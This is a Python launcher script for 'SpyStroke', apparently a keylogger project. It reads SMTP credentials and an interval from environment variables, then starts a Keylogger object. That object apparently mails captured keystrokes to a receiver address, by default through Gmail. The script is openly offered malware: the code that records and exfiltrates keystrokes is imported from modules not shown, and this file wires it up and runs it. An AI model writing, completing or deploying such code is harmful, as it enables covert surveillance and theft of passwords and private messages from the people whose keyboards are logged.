#!/usr/bin/env python
"""SpyStroke — email delivery entry point.

Run with ``python main.py`` from this directory or ``python email/main.py``
from the repository root.

Reads configuration from environment variables (or a .env file):

    SPYSTROKE_EMAIL
    SPYSTROKE_EMAIL_PASSWORD
    SPYSTROKE_RECEIVER        (optional)
    SPYSTROKE_INTERVAL        (default: 120)
    SPYSTROKE_SMTP_HOST       (default: smtp.gmail.com)
    SPYSTROKE_SMTP_PORT       (default: 587)
    SPYSTROKE_SMTP_TLS        (default: 1)

Example:
    export SPYSTROKE_EMAIL=you@gmail.com
    export SPYSTROKE_EMAIL_PASSWORD=your-app-password
    python email/main.py
"""

from __future__ import annotations

import logging
import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, _HERE)  # sibling modules (keylogger)
sys.path.insert(0, os.path.dirname(_HERE))  # repository root (spystroke package)

from spystroke.config import load_email_config  # noqa: E402

from keylogger import Keylogger  # noqa: E402

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    config = load_email_config()
    config.validate()

    keylogger = Keylogger(
        time_interval=config.interval,
        email=config.email,
        password=config.password,
        receiver=config.receiver,
        smtp_host=config.smtp_host,
        smtp_port=config.smtp_port,
        use_starttls=config.smtp_tls,
    )
    keylogger.start()
